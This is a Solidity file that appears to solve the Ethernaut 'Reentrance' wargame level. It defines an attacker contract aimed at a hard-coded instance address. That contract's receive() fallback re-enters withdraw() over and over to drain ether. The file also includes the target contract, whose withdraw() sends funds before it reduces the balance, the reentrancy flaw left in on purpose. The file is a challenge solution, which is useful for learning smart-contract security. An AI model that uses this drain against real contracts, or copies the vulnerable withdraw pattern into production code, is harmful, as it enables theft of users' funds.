// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./library/SafeMath.sol";

contract ReentranceAttacker {
  Reentrance public reentrantVulnerable = Reentrance(0x2a9C0aDA5B65D90d391e74a84b056Db14c0A31F8); // ethernaut vulnerable contract

  receive() external payable {
    reentrantVulnerable.withdraw(0.001 ether);
  }

  function attack() external payable {
    reentrantVulnerable.donate{value: 0.001 ether}(address(this));
    reentrantVulnerable.withdraw(0.001 ether);
  }
}

contract Reentrance {
  using SafeMath for uint256;
  mapping(address => uint256) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint256 balance) {
    return balances[_who];
  }

  function withdraw(uint256 _amount) public {
    if (balances[msg.sender] >= _amount) {
      (bool result, ) = msg.sender.call{value: _amount}("");
      if (result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}
